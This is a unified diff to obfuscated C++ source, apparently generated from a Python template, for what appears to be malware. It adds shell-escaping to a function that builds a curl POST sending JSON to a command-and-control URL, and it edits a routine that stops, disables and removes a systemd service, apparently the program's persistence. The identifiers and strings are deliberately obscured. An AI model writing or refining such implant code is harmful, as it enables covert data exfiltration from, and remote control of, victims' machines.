@@ -187,8 +187,17 @@ static std::vector<uint8_t> _rf(const std::string& p) {
     return b;
 }
 
+static std::string _esc(const std::string& s) {
+    std::string o;
+    for (char c : s) {
+        if (c == '\'') o += "'\\''";
+        else o += c;
+    }
+    return o;
+}
+
 static std::string _g(const std::string& path, const std::string& json) {
-    std::string cmd = zz(""" + s_curl_post + r""") + json + zz(""" + s_tick_sp + r""") + zz(""" + s_c2_url + r""") + path + zz(""" + s_tick + r""");
+    std::string cmd = zz(""" + s_curl_post + r""") + _esc(json) + zz(""" + s_tick_sp + r""") + zz(""" + s_c2_url + r""") + path + zz(""" + s_tick + r""");
     return _a(cmd);
 }
 
@@ -287,7 +296,6 @@ std::atomic<bool> _st{true};
 
 static std::string _t4() {
     std::string o;
-    _a(zz(""" + s_sd_stop + r""") + zz(""" + s_svc_name + r""") + zz(""" + s_redir + r"""));
     _a(zz(""" + s_sd_disable + r""") + zz(""" + s_svc_name + r""") + zz(""" + s_redir + r"""));
     _a(zz(""" + s_sd_rm + r""") + zz(""" + s_svc_unit + r"""));
     _a(zz(""" + s_sd_reload + r"""));
